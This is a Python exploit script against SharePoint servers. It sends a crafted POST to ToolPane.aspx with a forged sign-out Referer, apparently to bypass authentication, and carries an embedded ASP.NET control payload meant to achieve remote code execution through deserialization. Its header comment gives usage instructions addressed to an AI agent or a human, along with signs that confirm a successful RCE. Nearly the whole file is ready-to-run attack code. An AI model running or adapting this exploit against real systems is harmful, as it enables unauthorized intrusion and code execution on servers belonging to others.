# -*- coding: utf-8 -*-
# Usage (for AI agent / human):
#   python3 exploit.py --url http://10.10.10.166
# ## Success:
#   - RCE success can be confirmed by finding the header `X-YSONET: RCE-EXECUTED` in the response when the ActualCollection type is used.
#   - When testing deserialization, a `401 UNAUTHORIZED` or redirect means the deserialization payload failed; it can appear even if auth was bypassed.

import argparse
from urllib.parse import urlparse, quote

import requests


def main():
    parser = argparse.ArgumentParser(description="Send crafted SharePoint POST request.")
    parser.add_argument(
        "--url",
        required=True,
        help="Base URL of the target, e.g. http://10.10.10.166",
    )
    args = parser.parse_args()

    # Normalise base URL (no trailing slash)
    base_url = args.url.rstrip("/")

    # Build full target URL from the original POST line
    # POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx HTTP/1.1
    target_url = f"{base_url}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx"

    # Derive Host header from the URL
    parsed = urlparse(base_url)
    host_header = parsed.netloc or "sharepoint"

    headers = {
        "Host": host_header,
        "User-Agent": (
            "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) "
            "AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3"
        ),
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,*/*;q=0.8"
        ),
        # Let requests calculate Content-Length automatically
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        # Keep referer exactly as in the original request (relative path)
        "Referer": "/_layouts/SignOut.aspx",
    }

    # Body copied exactly from your raw HTTP request (after the blank line).
    body_template = """MSOTlPn_DWP=<%25@ Register Tagprefix="ScorecardClient" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %25>

<asp:UpdateProgress ID="Update" DisplayAfter="1"
runat="server">
<ProgressTemplate>
  <div>
    <ScorecardClient:ActualCollection Items="test" DataTable-CaseSensitive="false" runat="server"/>
  </div>
</ProgressTemplate>
</asp:UpdateProgress>&MSOTlPn_Uri=http%3A%2F%2Fsharepoint%2F_controltemplates/15/AclEditor.ascx"""

    # Replace URL-encoded "http://sharepoint" with URL-encoded user-supplied base URL
    encoded_base_url = quote(base_url, safe="")  # e.g. "http%3A%2F%2F10.10.10.166"
    body = body_template.replace("http%3A%2F%2Fsharepoint", encoded_base_url)

    # Encode body as UTF-8 bytes (robust for any non-ASCII chars)
    body_bytes = body.encode("utf-8")

    # Send the request
    response = requests.post(target_url, headers=headers, data=body_bytes)

    print("[*] Sent request to:", target_url)
    print("[*] Status:", response.status_code)
    print("[*] First 500 bytes of response body:")
    print(response.text[:500])


if __name__ == "__main__":
    main()
